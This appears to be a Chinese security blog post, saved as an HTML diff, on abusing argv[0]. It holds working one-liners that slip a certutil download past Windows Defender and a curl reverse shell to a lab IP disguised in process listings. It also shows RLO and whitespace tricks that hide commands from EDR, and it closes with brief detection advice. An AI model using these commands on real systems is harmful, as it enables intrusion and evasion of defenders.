@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="1y0ng" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      探秘argv[0]：程序参数中的安全隐忧 
+      
+      
+      |
+    
+     1y0ng&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon2.png">
+    <link rel="icon" href="/images/favicon2.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="1y0ng's Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/favicon2.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">1y0ng</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/Tool/">
+          <a href="/Tool/">Tool</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">探秘argv[0]：程序参数中的安全隐忧</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2024-09-13 11:28:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%85%8D%E6%9D%80/" title="免杀">
+                    #免杀
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="背景">背景</h2>
+<p>在《Why bother with argv[0]?》一文中，作者深入浅出地剖析了<code>argv[0]</code>在安全领域的潜在风险，学到了很多东西，与大家分享一下</p>
+<h2 id="概念">概念</h2>
+<p>程序命令行的第一个参数，通常反映程序的名称/路径，通常称为<code>argv[0]</code>，在大多数情况下可以设置为任意值而不会影响进程的流程。</p>
+<p>创建两个.c文件，分别为<code>echo_test.c</code>和<code>echo2_test.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> execl(<span class="string">&quot;/usr/bin/echo&quot;</span>, <span class="string">&quot;echo&quot;</span>,<span class="string">&quot;hello,world!&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> execl(<span class="string">&quot;/usr/bin/echo&quot;</span>, <span class="string">&quot;echo22222&quot;</span>,<span class="string">&quot;hello,world!&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>echo2_test.c传入的<code>argv[0]</code>为echo22222，但二者运行后都产生了相同的效果，可见一般情况下修改<code>argv[0]</code>的值不会影响到整个程序的运行。</p>
+<p><img src="image-20240912160742641.png" alt="image-20240912160742641"></p>
+<blockquote>
+<p><code>execl</code> 是 Unix 和类 Unix 操作系统中用于执行新程序的函数之一，属于 <code>exec</code> 函数族。<code>execl</code> 代表 “load”（加载），它用于替换当前进程映像，执行一个新的程序。函数原型如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="type">int</span> <span class="title function_">execl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *arg0, ..., (<span class="type">char</span> *)<span class="literal">NULL</span>)</span>;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>同时，在其他的编程语言中同样支持用户自定义<code>argv[0]</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import os; os.execvp(&#x27;/path/to/binary&#x27;, [&#x27;ARGV0&#x27;, &#x27;--other&#x27;, &#x27;--args&#x27;, &#x27;--here&#x27;])&quot;</span></span><br><span class="line">perl -e <span class="string">&#x27;exec &#123;&quot;/path/to/binary&quot;&#125; &quot;ARGV0&quot;, &quot;--other&quot;, &quot;--args&quot;, &quot;--here&quot;&#x27;</span></span><br><span class="line">ruby -e <span class="string">&quot;exec([&#x27;/path/to/binary&#x27;,&#x27;ARGV0&#x27;],&#x27;--other&#x27;, &#x27;--args&#x27;, &#x27;--here&#x27;)&quot;</span></span><br><span class="line">bash -c <span class="string">&#x27;exec -a &quot;ARGV0&quot; /path/to/binary --other --args --here&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>但从安全的角度来讲，利用<code>argv[0]</code>可造成一定程度的安全风险。</p>
+<h2 id="杀软对抗">杀软对抗</h2>
+<p>以Windows Defender 为例，如果直接通过certutil -urlcache下载文件则会被阻止，但如果通过python将<code>argv[0]</code>置空，则可以成功执行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载echo1失败</span></span><br><span class="line">certutil -f -urlcache  -split http://192.168.74.135/echo_test echo1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载echo2失败</span></span><br><span class="line">python -c &quot;import os; os.execvp(&#x27;certutil.exe&#x27;,[&#x27;certutil&#x27;,&#x27;-f&#x27;,&#x27;-urlcache&#x27;,&#x27;-split&#x27;,&#x27;http://192.168.74.135/echo_test&#x27;,&#x27;echo2&#x27;])&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载echo3成功</span></span><br><span class="line">python -c &quot;import os; os.execvp(&#x27;certutil.exe&#x27;,[&#x27; &#x27;,&#x27;-f&#x27;,&#x27;-urlcache&#x27;,&#x27;-split&#x27;,&#x27;http://192.168.74.135/echo_test&#x27;,&#x27;echo3&#x27;])&quot; </span><br></pre></td></tr></table></figure>
+<p><img src="image-20240912163734429.png" alt="image-20240912163734429"></p>
+<p>另一种绕过的杀软的方法是向<code>argv[0]</code>中传入其他的正常内容来迷惑杀软，比如使用<code>attrib.exe</code>来隐藏文件时，可能会触发杀软，但在默认情况下，<code>desktop.ini</code> 文件是隐藏的，杀软可能会将这一情况进行排除，那么此时如果传入的<code>argv=[&quot;desktop.ini&quot;,&quot;+H&quot;,&quot;backdoor.exe&quot;]</code>可以在一定程度上进行绕过。</p>
+<h2 id="迷惑欺骗">迷惑欺骗</h2>
+<p>某些情况下，EDR设备会获取某个进程的执行命令供安全人员用于分析网络安全事件，此时可以利用<code>argv[0]</code>对进程的执行命令进行伪装。</p>
+<p>如下图所示，我们通过curl命令来反弹shell，同时令<code>argv[0]=curl localhost | grep</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c &quot;exec -a&#x27;curl localhost | grep&#x27; curl -Ns telnet://192.168.74.1:8888&quot;</span><br></pre></td></tr></table></figure>
+<p>此时通过ps命令显示的执行命令为：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl localhost | grep -Ns telnet://192.168.74.1:8888</span><br></pre></td></tr></table></figure>
+<p>显然对安全人员的分析造成了一定的欺骗，同时<code>argv[0]</code>的内容可以修改得更加复杂来迷惑安全人员。</p>
+<p><img src="image-20240912174449350.png" alt="image-20240912174449350"></p>
+<p>在Windows平台还可以使用<code>RLO（Right-to-Left Override）</code>来实施干扰。</p>
+<p>通过<code>\u202E</code>使后面的字符全部逆序显示来干扰安全人员的分析。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os; os.execvp(&#x27;curl&#x27;,[&#x27;curl \u202E&#x27;,&#x27;http://www.baidu.com&#x27;])&quot; </span><br></pre></td></tr></table></figure>
+<p><img src="image-20240913100442544.png" alt="image-20240913100442544"></p>
+<p>同时，也可以添加足够多的空白字符来隐藏执行的命令，在某些情况下，EDR为了节省开销只会截取特定长度的命令进行输出显示，从而让安全人员忽视这些危险操作。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os; os.execvp(&#x27;curl&#x27;,[&#x27; &#x27;*1000,&#x27;http://www.baidu.com&#x27;])&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="image-20240913101137257.png" alt="image-20240913101137257"></p>
+<h2 id="预防和检测">预防和检测</h2>
+<p>对于网络安全人员来讲，我们应该要了解<code>argv[0]</code>如何工作以及它所带来的网络安全威胁，同时采取一定的手段进行规避检测，对于过长的或者包含有RLO字符的命令应标记为可疑；又或者在报告命令行参数时直接忽视掉<code>argv[0]</code>，以减小其带来的影响。</p>
+<p>参考:</p>
+<p><a target="_blank" rel="noopener" href="https://www.wietzebeukema.nl/blog/why-bother-with-argv0">Why bother with argv[0]?</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/post/java%E5%86%85%E5%AD%98%E9%A9%AC%E6%A3%80%E6%B5%8B/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2024-09-13 11:28:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/%E5%85%8D%E6%9D%80/" title="免杀">
+                        #免杀
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%8A%97"><span class="toc-text">杀软对抗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%B7%E6%83%91%E6%AC%BA%E9%AA%97"><span class="toc-text">迷惑欺骗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E9%98%B2%E5%92%8C%E6%A3%80%E6%B5%8B"><span class="toc-text">预防和检测</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+  <div id="gitalk-container"></div>
+
+  <script>
+    function loadGitalkSuc() {
+      const gitalk = new Gitalk({
+        clientID: '94b011918fa9c2f8b107',
+        clientSecret: '10c1ce2d3cc22cc3586cb5ce5f7b322f1ebc1c6d',
+        repo: '1y0ng.github.io',
+        owner: '1y0ng',
+        admin: ['1y0ng'],
+        id: location.pathname,
+        distractionFreeMode: false
+      })
+
+      gitalk.render('gitalk-container')
+    }
+  </script>
+  
+    <link rel="stylesheet" href="/plugins/gitalk.css">
+    <script type="text/javascript" src="/plugins/gitalk.min.js" onload="loadGitalkSuc(this)"></script>
+  
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2024 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E6%8E%A2%E7%A7%98argv%5B0%5D%EF%BC%9A%E7%A8%8B%E5%BA%8F%E5%8F%82%E6%95%B0%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E5%BF%A7 + '&url=' + http%3A%2F%2Fexample.com%2Fpost%2F%25E6%258E%25A2%25E7%25A7%2598argv%5B0%5D%25EF%25BC%259A%25E7%25A8%258B%25E5%25BA%258F%25E5%258F%2582%25E6%2595%25B0%25E4%25B8%25AD%25E7%259A%2584%25E5%25AE%2589%25E5%2585%25A8%25E9%259A%2590%25E5%25BF%25A7%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/post/%E6%8E%A2%E7%A7%98argv[0]%EF%BC%9A%E7%A8%8B%E5%BA%8F%E5%8F%82%E6%95%B0%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%9A%90%E5%BF%A7/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
